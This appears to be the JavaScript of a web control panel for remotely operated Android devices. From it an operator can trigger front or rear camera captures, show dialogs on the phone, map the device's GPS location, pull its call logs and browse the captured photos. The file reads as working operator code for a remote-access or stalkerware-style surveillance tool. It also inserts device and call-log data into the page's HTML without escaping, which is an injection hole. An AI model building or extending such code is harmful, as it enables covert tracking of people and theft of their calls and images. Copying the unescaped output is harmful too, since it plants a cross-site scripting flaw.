const API_BASE = window.location.origin;
const WS_URL = `ws://${window.location.host}/ws?client=dashboard`;

let ws = null;
let selectedDevice = null;
let map = null;
let marker = null;

// ===== Init =====
document.addEventListener('DOMContentLoaded', () => {
  initNav();
  connectWS();
  refreshDevices();
  initMap();
});

// ===== Navigation =====
function initNav() {
  document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
      btn.classList.add('active');
      document.getElementById(`sec-${btn.dataset.section}`).classList.add('active');
    });
  });
}

// ===== WebSocket =====
function connectWS() {
  ws = new WebSocket(WS_URL);

  ws.onopen = () => {
    document.getElementById('wsStatus').className = 'status-dot connected';
    document.getElementById('wsLabel').textContent = 'Connected';
  };

  ws.onclose = () => {
    document.getElementById('wsStatus').className = 'status-dot disconnected';
    document.getElementById('wsLabel').textContent = 'Disconnected';
    setTimeout(connectWS, 3000);
  };

  ws.onmessage = (e) => {
    const msg = JSON.parse(e.data);
    if (msg.type === 'device_response') {
      handleDeviceResponse(msg);
    }
  };
}

function handleDeviceResponse(msg) {
  const status = msg.success ? 'Command succeeded' : 'Command failed';
  showToast(`${msg.command_type}: ${status}${msg.data ? ' - ' + msg.data : ''}`, !msg.success);

  if (selectedDevice === msg.device_id) {
    loadCommandHistory(msg.device_id);
  }
}

// ===== Devices =====
async function refreshDevices() {
  try {
    const res = await fetch(`${API_BASE}/api/devices`);
    const devices = await res.json();
    renderDevices(devices);
  } catch (e) {
    console.error('Failed to fetch devices:', e);
  }
}

function renderDevices(devices) {
  const container = document.getElementById('deviceList');
  if (devices.length === 0) {
    container.innerHTML = '<div class="empty-state">No devices registered yet. Open the app and start the service.</div>';
    return;
  }

  container.innerHTML = devices.map(d => `
    <div class="device-card" onclick="selectDevice('${d.id}')">
      <h3>${d.device_name || 'Unknown Device'}</h3>
      <div class="meta">${d.device_model || 'Unknown model'} | ${d.android_version || ''}</div>
      <div class="meta">ID: ${d.id.substring(0, 12)}...</div>
      <div class="meta">Last seen: ${d.last_seen ? new Date(d.last_seen).toLocaleString() : 'Never'}</div>
      <span class="online-badge ${d.is_online ? 'online' : 'offline'}">${d.is_online ? 'Online' : 'Offline'}</span>
    </div>
  `).join('');
}

function selectDevice(deviceId) {
  selectedDevice = deviceId;
  document.getElementById('deviceList').parentElement.querySelector('.section-header').classList.add('hidden');
  document.getElementById('deviceList').classList.add('hidden');
  document.getElementById('deviceDetail').classList.remove('hidden');
  document.getElementById('detailTitle').textContent = `Device: ${deviceId.substring(0, 12)}...`;

  loadCommandHistory(deviceId);
  loadDeviceLocation(deviceId);
}

function showDeviceList() {
  selectedDevice = null;
  document.getElementById('deviceDetail').classList.add('hidden');
  document.getElementById('deviceList').classList.remove('hidden');
  document.getElementById('deviceList').parentElement.querySelector('.section-header').classList.remove('hidden');
}

// ===== Commands =====
async function sendCommand(commandType, payload = {}) {
  if (!selectedDevice) return showToast('Select a device first', true);

  try {
    const res = await fetch(`${API_BASE}/api/command`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        device_id: selectedDevice,
        command_type: commandType,
        payload
      })
    });
    const data = await res.json();
    showToast(`Command sent: ${commandType} (${data.status})`);
    loadCommandHistory(selectedDevice);
  } catch (e) {
    showToast('Failed to send command', true);
  }
}

function capturePhoto(useFront) {
  sendCommand('CAPTURE_PHOTO', { front_camera: useFront });
}

function promptDialog() {
  document.getElementById('dialogModal').classList.remove('hidden');
}

function closeModal() {
  document.getElementById('dialogModal').classList.add('hidden');
}

function sendDialog() {
  const title = document.getElementById('dialogTitle').value;
  const message = document.getElementById('dialogMessage').value;
  if (!message.trim()) return showToast('Enter a message', true);

  sendCommand('SHOW_DIALOG', { title, message });
  closeModal();
  document.getElementById('dialogMessage').value = '';
}

async function loadCommandHistory(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/commands/${deviceId}`);
    const commands = await res.json();

    const container = document.getElementById('commandHistory');
    if (commands.length === 0) {
      container.innerHTML = '<div class="empty-state">No commands sent yet.</div>';
      return;
    }

    container.innerHTML = `
      <table>
        <thead>
          <tr>
            <th>Type</th>
            <th>Status</th>
            <th>Time</th>
          </tr>
        </thead>
        <tbody>
          ${commands.map(c => `
            <tr>
              <td>${c.command_type}</td>
              <td><span class="status-badge ${c.status}">${c.status}</span></td>
              <td>${new Date(c.created_at).toLocaleString()}</td>
            </tr>
          `).join('')}
        </tbody>
      </table>
    `;
  } catch (e) {
    console.error('Failed to load commands:', e);
  }
}

// ===== All Commands =====
async function refreshAllCommands() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let allCommands = [];

  for (const d of devices) {
    const cmds = await fetch(`${API_BASE}/api/commands/${d.id}`).then(r => r.json());
    allCommands.push(...cmds.map(c => ({ ...c, device_name: d.device_name || d.id.substring(0, 12) })));
  }

  allCommands.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));

  const container = document.getElementById('allCommands');
  if (allCommands.length === 0) {
    container.innerHTML = '<div class="empty-state">No commands yet.</div>';
    return;
  }

  container.innerHTML = `
    <table>
      <thead><tr><th>Device</th><th>Type</th><th>Status</th><th>Time</th></tr></thead>
      <tbody>
        ${allCommands.slice(0, 100).map(c => `
          <tr>
            <td>${c.device_name}</td>
            <td>${c.command_type}</td>
            <td><span class="status-badge ${c.status}">${c.status}</span></td>
            <td>${new Date(c.created_at).toLocaleString()}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

// ===== Map =====
function initMap() {
  map = L.map('map').setView([0, 0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; OpenStreetMap'
  }).addTo(map);
}

async function loadDeviceLocation(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/location`);
    const locations = await res.json();
    const infoBar = document.getElementById('locationInfo');

    if (locations.length === 0) {
      infoBar.classList.add('hidden');
      return;
    }

    const latest = locations[0];
    map.setView([latest.latitude, latest.longitude], 15);

    if (marker) map.removeLayer(marker);
    marker = L.marker([latest.latitude, latest.longitude]).addTo(map);
    marker.bindPopup(`Lat: ${latest.latitude}<br>Lng: ${latest.longitude}<br>Time: ${new Date(latest.timestamp).toLocaleString()}`);

    infoBar.innerHTML = `Latest: ${latest.latitude.toFixed(6)}, ${latest.longitude.toFixed(6)} (${new Date(latest.timestamp).toLocaleString()})`;
    infoBar.classList.remove('hidden');
  } catch (e) {
    console.error('Failed to load location:', e);
  }
}

// ===== Call Logs =====
async function refreshCallLogs() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let allLogs = [];

  for (const d of devices) {
    const logs = await fetch(`${API_BASE}/api/device/${d.id}/calllogs`).then(r => r.json());
    allLogs.push(...logs.map(l => ({ ...l, device_name: d.device_name || d.id.substring(0, 12) })));
  }

  allLogs.sort((a, b) => new Date(b.call_date) - new Date(a.call_date));

  const container = document.getElementById('callLogsList');
  if (allLogs.length === 0) {
    container.innerHTML = '<div class="empty-state">No call logs. Use "Get Call Log" command first.</div>';
    return;
  }

  container.innerHTML = `
    <table>
      <thead><tr><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th></tr></thead>
      <tbody>
        ${allLogs.map(l => `
          <tr>
            <td>${l.device_name}</td>
            <td>${l.phone_number}</td>
            <td>${l.contact_name || '-'}</td>
            <td>${l.call_type}</td>
            <td>${Math.floor(l.duration_seconds / 60)}m ${l.duration_seconds % 60}s</td>
            <td>${new Date(l.call_date).toLocaleString()}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

// ===== Photos =====
async function refreshPhotos() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let allPhotos = [];

  for (const d of devices) {
    const photos = await fetch(`${API_BASE}/api/device/${d.id}/photos`).then(r => r.json());
    allPhotos.push(...photos);
  }

  allPhotos.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));

  const container = document.getElementById('photoGrid');
  if (allPhotos.length === 0) {
    container.innerHTML = '<div class="empty-state">No photos. Use "Capture Photo" command first.</div>';
    return;
  }

  container.innerHTML = allPhotos.map(p => `
    <div class="photo-card">
      <img src="${p.storage_url}" alt="Captured photo" loading="lazy" />
      <div class="photo-meta">
        ${p.camera_type} camera | ${new Date(p.created_at).toLocaleString()}
      </div>
    </div>
  `).join('');
}

// ===== Toast =====
function showToast(message, isError = false) {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.className = isError ? 'toast error' : 'toast';
  toast.classList.remove('hidden');
  setTimeout(() => toast.classList.add('hidden'), 4000);
}
